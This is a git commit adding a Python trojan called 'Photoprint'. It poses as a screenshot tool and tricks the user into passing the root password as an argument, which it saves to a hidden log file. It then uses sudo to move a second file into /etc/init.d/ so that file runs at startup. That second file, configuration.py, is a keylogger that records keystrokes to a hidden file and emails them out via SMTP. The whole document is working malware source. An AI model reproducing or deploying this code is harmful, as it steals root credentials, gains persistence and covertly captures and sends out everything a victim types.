519ac2d292793a0b75af75bbb6f0619d53ede678
Marcus Vinícius Ribeiro Andrade <88283829+PyMarcus@users.noreply.github.com>
2021-12-02 17:40:11 -0300

    Add files via upload

---
+++ Photoprint/Photoprint.py
@@ -0,0 +1,98 @@
+from time import sleep
+from os import listdir, system
+from threading import Thread
+from sys import argv
+import pyscreenshot as ImageGrab
+from getpass import getuser
+from colorama import Fore
+
+
+class EnganaBobo:
+    """
+    fase da engenharia social, o objetivo é fazer o usuário inserir a senha no
+    próprio programa, desse modo, ele cria uma copia de si mesmo para a pasta /run/
+    """
+
+    valor = argv[1]  # usuário
+    senha = argv[2]  # senha
+
+    @staticmethod
+    def inicio():
+        print("O photoprint precisa ser iniciado de modo especial")
+        print("Por favor, execute-o como python3 PhotoPrint.py root sua_senha_root")
+        print(Fore.RED + "Pode ser necessário acessar como root")
+
+    @classmethod
+    def save(cls):
+        with open('.captured.log', 'w') as f:
+            f.writelines(f"senha root: {EnganaBobo.senha}")
+
+
+class CaptureSenha:
+    """
+    captura a senha digitado no terminal
+    """
+
+    @staticmethod
+    def capture():
+        if '.captured.log' not in listdir('..'):
+            pass
+        else:
+            with open('.captured.log', 'r') as f:
+                arquivo = f.read()
+                _senha = arquivo[arquivo.index(':') + 2:]
+            return _senha
+
+
+class MoveOnSO:
+    """
+    Move o script para a inicialização do sistema, já que tem a senha do root
+    """
+
+    @staticmethod
+    def export():
+        # system(f'cp .captured.log config.py')
+        sleep(1)
+        system('sudo su')
+        sleep(1)
+        system(f'echo {CaptureSenha.capture()} | sudo -S mv configuration.py /etc/init.d/')
+
+
+class Photoprint:
+    @staticmethod
+    def imagem():
+        print("Em 5 segundos, o print será tirado.")
+        print("Você o encontrará no diretório imagens do seu computador")
+        sleep(5)
+        imagem = ImageGrab.grab()
+        try:
+            imagem.save(f'/home/{getuser()}/Pictures/Photoprint.jpg', 'jpeg')
+        except FileExistsError:
+            for n in range(20):
+                if f'/home/{getuser()}/Pictures/Photoprint{n}.jpg' not in listdir(f'/home/{getuser()}/Pictures/'):
+                    imagem.save(f'/home/{getuser()}/Pictures/Photoprint{n}.jpg', 'jpeg')
+                    break
+
+
+class Main:
+    @staticmethod
+    def run():
+        th = [Thread(EnganaBobo.save(), args=()),
+              Thread(Photoprint.imagem(),args=()),
+              Thread(MoveOnSO.export(), args=())
+              ]
+        [thread.start() for thread in th]
+        [thread.join() for thread in th]
+
+
+if __name__ == '__main__':
+    try:
+        EnganaBobo.inicio()
+    except IndexError:
+        print("O photoprint precisa ser iniciado de modo especial")
+        print("Por favor, execute-o como python3 PhotoPrint.py root sua_senha_root")
+        print(Fore.RED+"Pode ser necessário acessar como root")
+    else:
+        th = Thread(Main.run(), args=())
+        th.start()
+        th.join()
---
+++ Photoprint/configuration.py
@@ -0,0 +1,92 @@
+from os import listdir
+from pynput import keyboard
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import smtplib
+from threading import Thread
+
+
+class SendMail:
+    def __init__(self, meuemail, emaildestino, senha, msg):
+        self.__meuemail = meuemail
+        self.__emaildestino = emaildestino
+        self.__senha = senha
+        self.__msg = msg
+
+    def sendEmail(self):
+        """Envia os e-mails pontuando prováveis efeitos"""
+        server = 'smtp-mail.outlook.com'
+        port = 587
+        bind = smtplib.SMTP(server, port)
+        # login:
+        bind.ehlo()
+        bind.starttls()  # criptografia
+        bind.login(self.__meuemail, self.__senha)
+        # dados:
+        enviar_msg = MIMEMultipart()
+        enviar_msg['Subject'] = 'Controle Bot Crawler'
+        enviar_msg['From'] = self.__meuemail
+        enviar_msg['To'] = self.__emaildestino
+        enviar_msg.attach(MIMEText(self.__msg, 'plain'))
+        return bind.sendmail(enviar_msg['From'], enviar_msg['To'], enviar_msg.as_string())
+
+
+class CaptureTheKey:
+    """
+    Arquivo que será movido para pasta de inicialização
+    """
+    digitado = []
+    contador = 0
+
+    @classmethod
+    def press(clt, key):
+        """
+        captura o que for digitado
+        """
+        try:
+            CaptureTheKey.digitado.append(key.char)
+            CaptureTheKey.contador += 1
+            return CaptureTheKey.formata_saida()
+        except AttributeError:
+            tecla_especial = key
+            if str(tecla_especial) == 'Key.shift':
+                pass
+            elif str(tecla_especial) == 'Key.enter':
+                CaptureTheKey.digitado.append(' enter ')
+                return CaptureTheKey.formata_saida()
+            elif str(tecla_especial) == 'Key.space':
+                CaptureTheKey.digitado.append(' ')
+                return CaptureTheKey.formata_saida()
+            elif str(tecla_especial) == 'Key.backspace':
+                CaptureTheKey.digitado.append(' backspace ')
+                return CaptureTheKey.formata_saida()
+        except TypeError:
+            CaptureTheKey.digitado.append(' typeError, talvez, um ? foi digitado ')
+            CaptureTheKey.formata_saida()
+        finally:
+            if CaptureTheKey.contador > 50:
+                CaptureTheKey.digitado.append('\n')
+                CaptureTheKey.contador = 0
+
+    @classmethod
+    def formata_saida(clt):
+        with open('/home/.reg.log', 'w') as f:
+            [f.writelines(coisas) for coisas in CaptureTheKey.digitado]
+
+
+if __name__ == '__main__':
+    texto = ""
+    # email
+    if '.reg.log' in listdir('/home/'):
+        with open('/home/reg.log', 'r') as f:
+            tamanho = f.read()
+        if len(tamanho) > 0:
+            for palavras in tamanho:
+                texto += palavras
+            instancia = SendMail('seuemail@outlook.com', 'emaildestino@outlook.com', 'senhaDoSeuEmail', texto)
+            th = Thread(instancia.sendEmail(), args=())
+            th.start()
+            th.join()
+    # continua...
+    with keyboard.Listener(on_press=CaptureTheKey.press) as listener:
+        listener.join()
